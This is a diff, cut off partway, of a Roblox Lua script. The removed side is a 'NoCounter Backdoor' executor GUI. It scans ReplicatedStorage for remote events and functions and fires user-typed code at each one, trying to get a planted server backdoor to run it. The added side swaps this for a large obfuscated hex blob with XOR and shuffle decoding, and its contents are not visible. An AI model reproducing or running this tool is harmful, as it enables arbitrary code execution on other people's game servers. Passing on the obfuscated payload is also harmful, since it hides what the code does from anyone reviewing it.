@@ -1,304 +1,39 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
- 
--- Click sound helper
-local function playClickSound(parent)
-	local sound = Instance.new("Sound")
-	sound.SoundId = "rbxassetid://7593297942"
-	sound.Volume = 1
-	sound.Parent = parent
-	sound:Play()
-	sound.Ended:Connect(function()
-		sound:Destroy()
-	end)
+-- // Protected by Monsy Obfuscator
+local DpHUmzU1dP={"1fdcf2dc9d18a24ea400afac146e77ba92792e8b0385bc0a67fa0c25f21d7128c84beb232d1acb559e4bd4270ce5b4d9c5c79bc50e18f2304b3c59489455dd6aa15399d4f9372b2ff1d413043a5f364aae1bd83f2c154d581c9206864cab010c789e2be6","263338f216f1c561786fc2bcc325fb1b7f0585eabd6780895cbc75c44179326d226537258b0bd92d35cbac904e1c9af63132b3fd7d4d71db409620c8332afee1f4de577f5f683490b7b41997409d29cb11db232ab1de2fc369a3c2dca8d0684792e96838","23e5c62ca51b8cb1868a90cd7587e3587a9f73ac75d04c40cb413dbef4b23e40f705d4da472c0a29d67be51bc826b00f99fc252e48dd0f302395668525c6ec24076e2af4af8fc341128932f2960eb68d37b2643b94f968c5aa062114b6af323e874d5d91","11051c7bddb7c1cf1fcd63d737a141893418bcad300b3e00f2c2361dae3b93afe19b904eafbf620e9f8a7cd9c0efc4236b50b00728cb9a9133d342614b256a9b0db049fcfc264f113fcb24ce482632474ff604f2a13a2f39934b0d93a9a02ede6b856838","7f4ba1f1f51328d27ad58bff9ea663baa44f04837b6868afaa5ecdd7168c50fe416aa8c8a6158dc74307817542f730d49412d0891e4d48f830c2da911cc77cfe6e01369109910c764c61bf1c6cde1168eb02d7f631527ea06add4365ff78166580b5359f","862e9656a096f81bca672cd96fa8f98919e9d071cabb453f2f96e616e5dfc87df43b28dc7dd9be3e90e3014e449d625797092c5f89f6d264229b8522601b2b2e1ff4efce84a0980fbe07f02d468224c1cfd865b9f666bf40091105e886b781cf6ae73d04","809ff11810d54326c52ba84066cf9f1e24f643ca347a26d12b92633e00e44ebc8c1e104db13647037f8bb4b59cb82b7a7fb25c36226f247622ceb5791fad5c1c7bf324083a804a2299ee255c18fefbbcc9d52cda38cb283ad43836e78b5b0f8a41d24df2","18536d3e70cd75bea207ab340dd2f0fb34bef774dd31e7a815ca91fa6777aad7dbd1e6acbf0a0797fe163880d63127ceefbf055737af4036da87486fe97038d279b45e5704996634c3059abdf6eabb1a1720fb2d06fa28fd3805d20e8d58dd9cdc204c7b","40a9993ce3f0d6fde9fde46cb911247f6b89f0fb9c547747310d90f5d84072b37bd7cd030aa268889a5c6bc6e1764aec8959ece79374619650fffb8c94d29abf4ff00471217bb23f52db92018e66e16e4f7670e953c6fd9171099f5d234174f44134def6","b760d7f1ac15693d930f37bf1a9a563ce5a5898b35f7f49a398066d63393a1a9ca99d1ce377c8100f23edef8792f2b238b9041a9fe301fa343c60e3bc09cfe07fef8993991452af2699634f8d7a7cc778ac2dde6182417f9f99fab200797b441ddcdd1cb","b3fb4b4fe10f47aebc58963119e45dc0f26a72c369a181017f4779b977ff3d25d3ebd6acd657173cf17b48a6f207b596a9ca550484c326fb23e4057cd204042c14e26d9899fc4a2c2dc9d28320a2a83b27f4a73518bb89d570db9fb07cd7ee0d1f019ae9","d1337c724967b8a9c610f3831137b39e4f29f125677e383c7b7d686e253dce6f90c0d1d244fffec13f6df0b7d234a2e7f559245dd99438291b61d7e4e30a3dbc50f40c408685065080fc287ec9556b7dd9de95554856d7d8f0f5b085df87bcbf0a7aca61","c2d9d20ee46d37d9485b23ee20510ddef4dd503c8a167216e7c47e34e5dc8d19ce219c46bf8ac60b35bcfc76307c54c7df424f1d7669b524936a5b6460a2380161c187609c893c557d46392f4bad2a7e9caf7932f63e48673820c88acb7eb35e1d1a9800","1c4ed8de726fd2f0bb7c7298b13665a09399dbf6a062f901dece076449f0fcf9feacb935cc8caa74325e676a3e4bd1bf7b264d91211da9f92e1e63c5c57d2e56e3c33404972b650dbdcb6e791ad5c12ea5420615ce2edd23ce305f7029a1859d9933f47e","7bc67e987679aa4f7c35340698283c8b1d0806cc963b96909d933ed2197b4627490adad7dc0f85c6c8671d0dc22d7d216681009ab32951ca6b956348641ade26d9053279f2252da0dc5ddbc264db527e2860085af6f3358e9fc5aac4c03641310697d629","7927d70df2617bdbe39600404c60014568920a58bc9c8f817b048fe9cac838308a8731018766b75fe1aa873c7154ab0c77aafe593eb94ebe023b3c815fcf766016b4bf68e59679ea90758dea89c03ef34a7867af911293e6f22e90d2bfcc87392d94518d","4e98dad607e518a425818ae1eaa5ffd082328e2dc208962bbcbe2592f5de35a3dd781f8dabd6373991304f686d1679763395c87b8da596a0cde52794077932f5f88ddeede11f63b696ac40be336512a203c41c8399222c1a939c4b8ddd9312ca989a683e","fcdd7a0d7f11dc3e0d9caa838c4a40b9467aee41114ab5b12e8444f7cd5641a7d78a8cf3127364d346aa4a006cd4909847042e918d10b2cb4fddd26302a29ab1fe4d6b1a5cbe60c727d19a0b6c1e2d6d86169bf2b7b2f4e6b7e37d056ca2329e992b8fbf","7c5dd6f27ac7b1fb285e8ef7335ea09d08019c49285d47d6de26925bddca2073eba479809b365bf4ac279e16d39add061f983c8e834bd72176adbf76befd668b65f04aac9b24020c3b5fa97b8c7020acd637c62d7b3c314add94d9fe5b142c16c07b0c32","90742f2fda119f09ea630c35d7433d4a280649f41b5c71465fb5c1bc2cb823f27de5dc7a9642974edc3c9ed4d594122b70d62707dc6127596e9cc22f938b0aa77c9d378b18819a8b6a8c7ea9376f0461f81edc68fd22c41d713b7bf2489c887117b39ffb","5796af5fa2fc202875abacdb9dbde76e7a694f061792a79405044d3a99bd613d0aef8816267007d1d50b770c2e1df35f975ec3457eac5311bcb6230673f08b5aa72881915abdac2c1912658d3f133ef9f18d43924634dd68245b29b9b53cd6a7fe3b0793","91f97d9b26453d712bc9cc0ce6bcff69cc734b46adb761607c397d7236766ab174d71e660436ef58db35603063fbfeea9237448c4a233acdb4862a681022ee1fe6bf204965089eddbbdd3ac22deb48d267c57b0b7400fdfd385af0efbd35c36c1e1fd00c","ff1b7dd3cb9dda4128ce6d36b3d117f9c60fb50945d004fbbfa74b0f35a0a878261eaf9c8d76977c11c3835c719c0f7358d5434023cde14b262dcd332989743cab9c6cc80d9be37dc3dfe9097a8d740a7ef0fc972f11ceea5c75b4f96d1eb821e59ec279","7bcf304d74072a6aaaba862b3d0d9248cb202732200ae12c336df90ad190363c688dcc156f3daaf8f0790cbd9b5c32b13579283c2c3b00996d5f2a638e9b308cf70c977d84d036014f0195976b67a23080b4f8bf702c67a2496dde08a1247a27079ffecf","7e68332149230c510a3199dfefccf3ff69a820c7b6622c5a3e00505e0f1d11276bfff9179e88e1e78965d2a205c4abd71774c096f492c13e8d94a9a1871f62b36c91302f3ea9ea2fbc823b87f3c08931e635dd34d9e6e2ae24e3d6c49906940d07c6911d","5a7323231dd028d9006b078dc9c9120ae7d90520db8d426cb3ddce39f3a694f269321542d04aa29c9f661c757a1a4945f857ab87119ed281b18c56c6b8447448a7f55fc6717319a1f8dd06782ac7df197f7e388fa859ddc04a6b9974c258b169972877b0","227b403ccefb366cc0543ab1b67c9f91b553da12bf723a2bca58df414e991727957dd86ea8ca197a12c12d0bd145d18f1c9c2bf10c30a6352e0ecfafb14ee162104c669085de3fb3ca737f78e8e7f04ee1d611d98f547422e08d7d395c3cfd8d3b7fd37c","08e8ebefd2bf454fdf9fd66ed633e47d9fd45600d64a0b81c0e9b5db3ebada2afdaf7904af45682097e549d9cac0c4907d969abd02873ccf5d66f5c03862e1943ff0ea70be3a7cab8e3a30235d783d4acbb20c569f9d1bf3499cac85c6c47bead0c1e3e6","b6b5e3392fab6dac69d3a7849a9598867d9f9eda16b1b756815103687a3b15978bea16b8e3f5d568cc8dd47b8c96b83bc5a04600ccc449dd25ad25ab754c2debd460ba90b95e812faa1356c8c611c2c2a9c400e666f2b047052cd29f0d85623e90d0cd70","5ccb9bcf55976c722cda1a491c1d90f8de6deb6fd93800601dba8291fef660d9d7e42270654034d6c7e31c592301626628f7a08784b89f67d93757943f859ca012624fb6197c94465f3556697d762e1a616a30296c817240d1e73a5caf66934895b7e2d1","e73a81b68501903078d9d6c10ca6deb00c410ec03d1f6bf0e8ca2673ef315270676372a4b1e571fbd7bdccfe66ed53d7a211a926ac3e193abb0b9cd104da7d77dd3799b22525fb6c9a206b963d7b017ce633c7597c3b6f7b5219306efffeca17b9c82cc4","8f9b313e9cfc96db2f6a011b09e8074cff6241bf731fb40adb19b3acfe343e56ab5260adb766298ba1b23a35b9d8688aa7ad2e00c2f6a6f229bd6340bcad4897606310dfb98649b1242a99c411b13598199561d7fc744ccb9f1b48590fe6b93389ac28b7","90801060c090a8321402e8811f407336738a4cf4892a1ae57b24e7f0692d9e87ce576579a876c0cc751b9c751d680fc071fedbc5bc601b3fd4bf8bdc1961c4636fe0ae114e4cbcb1670d41f0827f8b2bc8c305ddbb29cd01a0708b0ad70a95b2a31f8455","7c089807adb62b8e40e7116e033e489c2697253f70a2acd6d437bdd5f1b18ac92b072a00443e24d5bb015eadc57d8e3c54cfdc358c9fd5ca91fc674acf486e2e9c82a47a6845edbc7e8d559f23911906cf342e83d3c02a7bba920e7aaf3f284843711666","a4df954d9ad8be88f4f2343342f4f76704c0ce9650809a7f26bcf8502f76705c679ae734a5985e9b704b2db7af523e93f09393894694de55ab7a36565ecb64abd7a42d4d3754663b68db54399ab9bbd99e7cdc6e76cc817b709d43d77fe38a2fe939f0bc","d1203134d9c1da2d150d216aa89b2a3a824c2432af548e90995d2a09cc2e9dd63d62b1b0a0c0ac9102042990cb6a6b001a6e48c1d7c963c3253188721dce5136c01b601ec687e3193e91ccb26ee8b6bf147846bc2f018d455ccc7066dc153210bbf24ce0","e72259f161f648249f2406616b2cd5d7e02d776501b632037283bc61bb5c9c762260679064d2b5b728cceefbb11e84168f0e71367ade5ea2e76e5567f9e25aafaccdd90645cb8b725c00fe89409a5935d0228d12674d2d63dedc6d0c279effd3619e2326","bd732a70de9d9e91e2644fdc29ee020faab1d6f1a1c8bae0e907893cfbc0c651081035d37044e2caa7194dabd64c8a9c50c20d9f975a797307533b679a2aca966a793226b71ac76ef9669c85509ffa949d0af935ad800f49438c45aa9d7c4d0cd5c7f5a6","dc965e07ebb7214d86255caffa8f332510f70c9517b293b156392bd47072d95591495112d12b2d605565ef890322618efbc0a1f3de30fb0fd9ca272a8bb92f5f9f92d09629c89e25201cbd1f3bd79a5fc606e4044b97e29771768926608dd9d7c37cd29a","be1d1ae0010280fc77282654ec415a77665964a4d506dfd92bf02337c7320cc7df16c072c89db60662f99720d76239873e5387e1c0919a9c524533b7e2f2002bde6c9dacb127b97855a63ece308a3550adde99b42260b304fb00cd6175dac6f656cd85e3","2b359c861c5ca89e1d34d6669cf20f39b6fec7b78f5edd05538c487a6bb331bbdcb5f8a5ab87db9b703f164a570b69794d22b5796c97026d3356e9f601232aa639e38d28385e9567c9ca59b8542ddefcdc54654b9779f65ef3bff53bfa2c4f11d6de889d","24645cd2c40117f29ff128916b5aba7db1bb3a95ad0dd1ced6d24f670f63f84c7ab789c0d835120d9ca4d5dad917c872d8b7c8327e69d5e949869fa136b5eccb2260fe67d5673719598d484ba7a2f2825cb0cbea7d4087dea68696d4b5eb72063f73d69b","da49998766bcaac8e57f380ccd2ebfca8ad799ff1e3c8c8a46305c6d3afc569ebf6e2f8c59fcde9205a091e306aee24a7a615145bb9dfa4932d7e8e37f7801fb908d9de7477df0fcd5ddc4049ccfccceb7d8f7c4257cb58c754f6bcba7f2d372cb095858","175a403b6b427d66786cdbdac59e30cdc352f5870b4e5c49d932409a6c669d4b7c2c84b4269b2880cb5ee9cc5f61040385bf5c9f1b32ec61dbea92c53c87877a8f4e364a90f0c01b349bf6fc428f7f1be7cd77adc408307772a299db64f8be04baf49ac2","3694214bc5ffdd3b4d4afb2bddd61f890e1d243bad0763c6e03ed7a79804864761c3ca7ac52b4a854a33d7cc19779e9740f6fd6f4d54edd5aad6d9e0bb86d4d0328407697f3a46340ccafbc9342a3466b298859d0a6907eeaffa9e689bc857e87f06dc5f","b4c1f69f15cae22b2bb71228276d482770f965330e28c01add94fcb5cd01eb61ced92370f49e6da36d6fa604f5798bccbec8767bac766b7e8e8ee264d5507a428adf662a7f6952faa86e0c785d81aaca5baa8ffadd8c5e478c25cf9c1ddce23b5d3b756a","8cb980cb466a9372876c68027cb60cce13936697d70399854f1675b0d90105d3f2220d81e319a31714a29d9f32f465b84b4c341651911504b4a66688389cc932c84b610f685e997b82166563e42b36cc46024f870a5988272800467bbe9bd4c3c747259b","f01fc95385d5818240dd667d5ef7843301d0b4631e0dcb906668aefe670e564a0b25dbc6b790a3a8e5f6cbab88516050090c02eb03ac75039f7898768d3363d9dc5a9f723299a6422d4d857713444a9f701d115463415c1b05130b4e33249162b770bf17","7d9d5b8d9b83c2c0979d6e1ccd265bdbf4e115297206533d13c1275ff7652e33cd24a01b90219bef499ee3a3f816da77d642319a655dc6a2b5d97f3aff7b547710185f283559f4f1e897fa2860d10a957cf0f0ea63042fb710d496d10cc2b2bde292fb21","7a3d5c5d8b38626aacaa83d20141ce92f624471823f4f4046a2a3079d85f91d857668b8df9463ee375344995274bbfe5332d4e58bf1628e7c9c01ce66cdb837006b01759fc833fbe39a38094dd219e0b50d8655fdfb32185e990acb0359cba81e413359b","ac0530d0a1b2bbb4039009a46031c68c4e5e0a3ea6d7674ad0ac638ba14dcfc10765f621889f5ac37dc8e5aed27d5bc47f148e1a312d6e62b13b31af211f34ae9180f5294ff251f62dca414f82f62458c55812186ec809797266e5612b26e77f39aa0a2b","0cb98c0faa2f7f8ae4572900205a298fac1c909d290e7e3292e70a17c6ae799e80450a1266ff86599e918d1f12252adb8678a5adc67e70eeeb9feac6f97a084e3c6c2da65bbaf11a1b30caaaaefe6f4fbbd0fc67ced7d43ff3cd85565dc6163b0961bdce","6e228b53c6571f7f11ac0ca1602b4c5f66cf9ece9a2161bc4a6169fa0a116fddcf19c0dcff60ad7721cbcc07def58f33c3769f319634a3af22c2a2ef85516985c0c04cb77c92d488ca05de37b1eb787419ce1adf7bb75e3f93bdc881d52c3201f37ac936","25eacb743b1fab97870f292976f75b70b76e7c05feed3fb1808d6e93468f7bf1c5221ae6de28b2642d0850aefed82803d3de9cd4d3ecf7b3da19a38b41acd56732971469c641bd4a0bf606889ac5291f66fc2bbb11d3673d2be58a09349200564d992102","66820c963e9e911d1060a97c11486ab1e13a776b2ab15ceaca8b80869bda6127503400f1fc23b3c48f2ec0b73cd8a722c83bcb771ad26cd67334391003fa4f350669daaa7d1d902545121db86f6924f86f9d8c0b695a0f4f82964ff3ca06a4cd67395351","1688eaba1324c25a4b07c0a0a1bbdabbdc57e81189924d04609650831ddfe3af7cb9e3cdb5ed212bbb32ca3d670c041863f7487b75ef963761c2036e065508d66ccea1a0361f05d7190369b95becda6f8171f3bee42dc3a52c26fb8a664006c970ac7889","c7ffbc0d8811d59d54e9a0bf2d8668fbea7359fc9ee332aa76ca328951759b50ed2d66e3c08db8fd12a1807141283664a88796379b2f0b56fe429d9d7e9a9a2fbd707e5c91d4ed881df3957eaee3e0235f1176b8d7062c98c8309f9a2ee990bfb59119cd","94202d5880a09d7b137623907e3f4be5086b15349ccf0bd58b5fa848796253c4933921a997d40fc4ef576ea1ffeb0061289ada4f9e90c0642835550d7fc2664bc3fef5393e4dcabd99798b070ac4b900ccfbcbaed662516b77cd04bb6fcc86af568b16aa","50e18f6b82ccbd1f1c3373549a41b3d260b5b3a2839c28f09043c3d4921b834e3f4d2c4bad9b7a2eea00cb6cacc8681861cd0b066dd213006598370e32d7d633d8e1815a0959a2aa3a95715dde7b4b6c3828444f3ffe756d9a3a6c97283918e695896407","760ca39c0ccc2e739b299c0e39b1802b36ddaa808886975c3e55b7fad134cfd38f55b4b7a40860346a66cb912e88d86892185eca45bd5c776e6f1739e38cd831db6ee70f5e2291d84eca8731616bfc38f15fe89105ddab15832d3dde688107b1de8c0f4c","aa3f19698c3c39fc0b937db6a4fde238d759ed22b791f9814896bbcd24eb17aed76d2d3cd2a5a69dfcdcfb45b7d9c6149a0bc0c2ca2b08c21169396ad7b3cfd6e9f7d1c3c6dee1fb6dad4bc39ecfff449e56a586e88acf27e9fa944e94d71b7f567afabe","3f6e7b95d56e0543737b0f41eceefe90d901f2c32b8cbdb78abd815ac5d300cff8cd569a37bc1c28d25525c5ed4d4278f6f123112e399f69af9901c460e70d20447e216d6d6a683a35cbb9734da8d75e7696966b7e40581d0c686b3d615a8afe3003ba30","d7dbc68efbd2d22a9c52c8d55687fe2e096c09ba2aebf485279bfe33e290c7da096dac04d5c4c984279dcdcd6698aabdc1962235a9262bffc330cd82c6d60c54208676f9b00f6a2e9b5dc0df5556bb7c4df3695030c2468d13818585b378b8068f8ad77d","9d2feb60339050c8c84f0f818118fb6a79e28d649cfdd4305be73e50111b382207ee501b4882fe721301151a9e8c444f17e2f0bfa9438724613b2daab15c38e31177357ef761dc4fadf9b1896ae58c3874355851620b746a14325d599fcf9196cc74eee1","9cd1dce295d0fb97b667410b87529b85f63b35dcdabff6d780e0321b616671d6105a9203bffb8d8b848c90b967872dfa22784a462a8ac45be33536718f7634f828254f9da673549df7823a3ca9c74fdf95dd64ce37958dc20aef014882c0ae1e619b2685","20386e368ac84b77cfc8fc40750cb5c01ad382629e30332b645c5feeb48e7f88672589cbe15ab13f3494fb1d789ea19c07c86b8bd246cb6fcedd25c03cd6844dad549e60db019ea0b1dc017f30720b3bec690a30e5e139358402a007f2e200f73d68ca30","4b65065c625745d93e14b9c86599607aab8667a81b4f1fa4859e4f53ab2f3fc88ea4490f619d623f59885d68d8cdedfe6c8c60ac569cac07637ee88affcb445df8786a32b266504bcc36189455733a00215b636a9d26cef5dd4a74504e8aa270290996ab","7335d0c44d5104d4c66987db6e01f8819438b279616d4245730131ccc85048fb108dcd4ddac7165f329a79309bb6bfb3b2e63602459b85f452c892a6f034672e5a1229e86c186b79385fc093f45814ce0dac632a676df9d39d96fe6fe784f16a2570ef21","bbfb269b7c78d7f84881766fb2771be1a69978b9044f1a5af29dc122b1266e7640b5626e7d7b7479b9ec6e69f2879534e873ff5f75eae1b3698fe43bdd1dcbbd23cee88ad88098e48a5aea2ee25d76e5c3647adc27333b1d4947226883ccc1cacd4b340d","c3879601311cbddd098304f5f25a1b70366dcbfd962a29495767d31591d6008d98225130f7bd83963614f1010beef603b74cda7287d29707049a2fff4ae67c9d7c039fbb62e4ea328b1777b1dd602c66ac106cf3610c1a464968dcce4683357be4f29184","c2173045b44dbf0f84f60290f3eb00fe2d9b7ea6eb9032ce4f769bca3fc23370b70ad7430881f84f43e136630671df94dcea90dd23b0b15576ac29286ba5f6216a9d40154b860e9cdc1738a0e45524e668087872c06a07eaa7801dfd7b3a9ee943561539","b735b349e39a797b8cab2bcfca65de1735b446d53d2660f43fd0abb1c6f99e907838977a71d7bdee247f2b69abf4e1017fb3741f942f9ab1d215d156157dcd6129a8c80d51f5ab7a721c4add03defcb1647ceb90db995b7d0660336561c5d90323bf02cf","6fd3de8b1120367c89561b7d106e0afe1f8c3b2072aaa17a6054716035db5e245225c4b4ccb2d5d6ebf87b9b321f99ef348f320b3c1c44e51aed6325e36c96db2baaad0c944a019399c9e13a4f8549fe89d096bece1abf948b198e2edce9505fca0c1cc6","66e915592e1bc44fb069bf4e634073ba4065cd9e0bbec220eec3a57e29619886cf684b1a8c026a7d9eca01ace79e0422430604e5acd7da357aa8b23cec2f303822f8c88e0bf7b78af91e71b3fb95008c97e64117d7b345da2678774a63bbc83607358aee","db9f7ad3d0833f4e7d02666d46b3010bb37bd93f76c0d926dc8ad7e7336a49fe541c95cdd02349fe0ac5d29b4d57b20056da270bc4de8522b3bf5f1a299b3c36ba70602723e37a91c775da763b0c683acb2ad02d7368fc712e0250a725d5d07ecb2cdcc1","853bd79c2ee70d6df8eb08db51e7979205fdf3c4e609769bcd5bb12545f4f7907cc4abc6d95f2ba7271412fa6214e8e3fe34561bf039d35392636ac490455a28d7f1f0c71a6e6a22da1994d6fb9fa50d995e71e6efcc048015c8b7a86d466d61ac4c77bc","6efefc04fe7626eea08cff87c69a0a4528b367cdb03de7cc355a888b0006b3165aea9f3886d2281729a0ccfc0fb90b9121598f4358db3166519c27fb6a60678db785d08c70542615b86d6cdfa51786dbdf89c0da17428910f932f0d4d68620cb623b6387","5b3f9821708f8f5a7bcd2f67ca017ff38b38331d7260754a8d32b83f8853d87a551d083a916bfa497c8467c40470901d72525e9f8833358dccfb56d45a5310b3f6f889b509d2d4744385746a8ac006e4a8ac6c066759deeacd5d0a61286a99683ac4f70c","21c6f1236df3e804e54d2a7aa1d011eafd770498a1e6d33c5a72f1c049e300b6bff7ccc5ead1ed573019c78b0876407d2b45c0a8d92e1badc38e68e5984f693de3a34ff27c80f0636ce2e3874da0ec4896b57b333b4ec5718016bb1c0d40261157b842da","5e6c9f0aea4090fdf38025e1b3926452f1d56245dd204cdd8ffe7981c649eb3d7c9c809fd74931193c7158fb991bc2223fbfa879c41e02caffbb08c637d9b300be03130c81970001dd4a2a6112c80584d114da46cb8150fa7966725a16970f110770acd1","9f79ef9a5c16308228456526d16cf21bec39dc7e332a2db0f67ed9e590d59e906db1167a22e62b17d790fe057b1a8dcc1276626087779be565cf3df63b66a0eb63e2b09c8078c6ff2e7a66be91765fe84a6efe70501cff9b9c899e350a137a344d304097","0b56ff7d5f32b8ef03cc12bd1a13ea1b7dc53eef95c11c6d3d8138eaf6846d69ba6bcb273efa485cfcff2fe4f2f088dd875f55dc1661d69a6f159bd2641bca608744cf3194341a127d3e1657143a7cb7b82f2b3343c36a001b7fda95f6c653cde37d6a42","9bf606446475035135345461ca1a7106280a962d8b9593aae49e00321642c69671ab07befad5727b49a64607d89488b692038b3971cb24fb45bacde437db9276dce06aab2a77e4a58d3277a5bc1f20dc2b40662e9a9e82f40f9eca676b17807afe0bbb3f","d768154ca1a6960a9d6d274d148341f1b889d2422a39ca70663fe16898f828f68a3b9d2bdc1396f96c4064e95614103210eac27832ec95cd87c1eb9524c2f038bad69cc52ccf24d616caab246036efe58b5d2c17882473a3601f09c6f5ddb03d241b5736","fbc991d5cecae69a5b219cd2cfa96f11f3448c7e2f7a7d2f22d38083682382c8a95a638ab29057167d084cd5a1ba5c37c0e299179bd550180de4e34f0ab782e9d78bfcbc342f85a8026002665c47062e214a228baf8c19b05b26fe090a8372f145c17386","f80a51e32d69925ce79c933d572fb66edd490b0c3435a0ba320638a73141af6ff73092423322868456398aa02e212083173303ddf40d5b8280fd635e7d07ebd4c29178967667fd5e"}
+local TPZmo43f8x=table.concat(DpHUmzU1dP)
+local IjnMu4DpUvD5ui={}
+for zOJ16xtWW=1,#TPZmo43f8x,2 do
+  IjnMu4DpUvD5ui[#IjnMu4DpUvD5ui+1]=tonumber(string.sub(TPZmo43f8x,zOJ16xtWW,zOJ16xtWW+1),16)
 end
- 
--- Function to scan for all RemoteEvents and RemoteFunctions
-local function scanForBackdoors()
-	local potentialBackdoors = {}
-	for _, obj in pairs(ReplicatedStorage:GetChildren()) do
-		if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-			table.insert(potentialBackdoors, obj)
-		end
-	end
-	return potentialBackdoors
+local dClJ5idt2HVcf={44,246,36,129,146,218,10,204,102,194,166,240,119}
+local GR2wxv7_rMfC08dj={148,212,8,101,153,156,32,3,122,157,133,210,30}
+for zOJ16xtWW=1,#IjnMu4DpUvD5ui do
+  IjnMu4DpUvD5ui[zOJ16xtWW]=bit32.bxor(IjnMu4DpUvD5ui[zOJ16xtWW],GR2wxv7_rMfC08dj[(zOJ16xtWW-1)%#GR2wxv7_rMfC08dj+1])
 end
- 
--- Function to send Roblox notification
-local function sendNotification(title, message, duration)
-	pcall(function()
-		StarterGui:SetCore("SendNotification", {
-			Title = title,
-			Text = message,
-			Duration = duration or 5
-		})
-	end)
+local iQWomdW50aFx=34387073
+local OHbexH26XUeqz6r3={}
+local zkewxsEwS1=iQWomdW50aFx
+for nyaYiqhV5=#IjnMu4DpUvD5ui-1,1,-1 do
+  zkewxsEwS1=(zkewxsEwS1*1664525+1013904223)%4294967296
+  local NtqAxfyYd=zkewxsEwS1%(nyaYiqhV5+1)+1
+  OHbexH26XUeqz6r3[#OHbexH26XUeqz6r3+1]={nyaYiqhV5+1,NtqAxfyYd}
 end
- 
--- Track body type toggle
-local isR15 = true
- 
-local function loadMainGui()
-	local ScreenGui = Instance.new("ScreenGui")
-	ScreenGui.Name = "NoCounterExecutor"
-	ScreenGui.Parent = PlayerGui
-	ScreenGui.ResetOnSpawn = false
- 
-	-- Main Frame
-	local MainFrame = Instance.new("Frame")
-	MainFrame.Size = UDim2.new(0, 500, 0, 350)
-	MainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
-	MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	MainFrame.BackgroundTransparency = 0.5
-	MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-	MainFrame.BorderSizePixel = 2
-	MainFrame.Active = true
-	MainFrame.Draggable = true
-	MainFrame.Parent = ScreenGui
- 
-	-- Profile picture
-	local ProfilePic = Instance.new("ImageLabel")
-	ProfilePic.Size = UDim2.new(0, 160, 0, 160)
-	ProfilePic.BackgroundTransparency = 1
-	ProfilePic.BorderSizePixel = 2
-	ProfilePic.BorderColor3 = Color3.fromRGB(255, 0, 0)
-	ProfilePic.Parent = MainFrame
-	ProfilePic.Rotation = 10
-	ProfilePic.ZIndex = 1
- 
-	-- Title
-	local Title = Instance.new("TextLabel")
-	Title.Size = UDim2.new(1, 0, 0, 40)
-	Title.Position = UDim2.new(0, 0, 0, 0)
-	Title.BackgroundTransparency = 1
-	Title.Text = "NoCounter Backdoor"
-	Title.Font = Enum.Font.GothamBlack
-	Title.TextSize = 22
-	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-	Title.TextWrapped = true
-	Title.Parent = MainFrame
-	Title.ZIndex = 2
- 
-	-- Auto Username Fill Button
-	local AutoFillBtn = Instance.new("TextButton")
-	AutoFillBtn.Size = UDim2.new(0, 160, 0, 36)
-	AutoFillBtn.Position = UDim2.new(0, 10, 0, 260)
-	AutoFillBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-	AutoFillBtn.Text = "Auto Username Fill"
-	AutoFillBtn.Font = Enum.Font.GothamBold
-	AutoFillBtn.TextSize = 18
-	AutoFillBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-	AutoFillBtn.Parent = MainFrame
-	AutoFillBtn.ZIndex = 3
- 
-	-- TextBox for command/code
-	local UsernameBox = Instance.new("TextBox")
-	UsernameBox.Size = UDim2.new(0.9, 0, 0, 200)
-	UsernameBox.Position = UDim2.new(0.05, 0, 0, 50)
-	UsernameBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	UsernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-	UsernameBox.Text = "Made by Team NoCounterFamily!!!"
-	UsernameBox.Font = Enum.Font.Code
-	UsernameBox.TextSize = 22
-	UsernameBox.ClearTextOnFocus = false
-	UsernameBox.MultiLine = true
-	UsernameBox.TextWrapped = true
-	UsernameBox.Parent = MainFrame
-	UsernameBox.ZIndex = 2
- 
-	-- Profile picture repositioning
-	RunService.RenderStepped:Connect(function()
-		local tbPos = UsernameBox.Position
-		local tbSize = UsernameBox.Size
-		local picSize = ProfilePic.Size
-		ProfilePic.Position = UDim2.new(
-			tbPos.X.Scale + tbSize.X.Scale - picSize.X.Scale - 0.05,
-			tbPos.X.Offset + tbSize.X.Offset - picSize.X.Offset - 10,
-			tbPos.Y.Scale,
-			tbPos.Y.Offset - picSize.Y.Offset + 25
-		)
-	end)
- 
-	-- Always show Megadan13098's profile picture
-	local thumbType = Enum.ThumbnailType.HeadShot
-	local thumbSize = Enum.ThumbnailSize.Size420x420
-	local success, url = pcall(function()
-		local userId = Players:GetUserIdFromNameAsync("Fertour_077")
-		return Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
-	end)
- 
-	if success then
-		ProfilePic.Image = url
-	else
-		ProfilePic.Image = "rbxassetid://0"
-	end
- 
-	-- Button styling helper
-	local function styleButton(button)
-		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-		button.BorderColor3 = Color3.fromRGB(255, 0, 0)
-		button.BorderSizePixel = 2
-		button.TextColor3 = Color3.fromRGB(255, 255, 255)
-	end
- 
-	-- AutoFill functionality (WITH CLICK SOUND)
-AutoFillBtn.MouseButton1Click:Connect(function()
-	playClickSound(AutoFillBtn)
- 
-	local input = UsernameBox.Text
-	for _, plr in pairs(Players:GetPlayers()) do
-		if plr.Name:lower():sub(1, #input) == input:lower() then
-			UsernameBox.Text = plr.Name
-			break
-		end
-	end
-end)
- 
-	-- Button actions
-	local bottomButtons = {
-		{
-			Name = "Execute",
-			Action = function()
-				local code = UsernameBox.Text
-				local backdoors = scanForBackdoors()
-				if #backdoors > 0 then
-					for _, backdoor in ipairs(backdoors) do
-						sendNotification("Fertour Executor", "Attempting to use: " .. backdoor.Name, 5)
-						local success, err = pcall(function()
-							if backdoor:IsA("RemoteEvent") then
-								backdoor:FireServer(code)
-							elseif backdoor:IsA("RemoteFunction") then
-								backdoor:InvokeServer(code)
-							end
-						end)
-						if not success then
-							warn("Error using " .. backdoor.Name .. ": " .. err)
-							sendNotification("Fertour Executor", "Error: " .. err, 5)
-						else
-							sendNotification("Fertour Executor", "Executed on " .. backdoor.Name, 5)
-						end
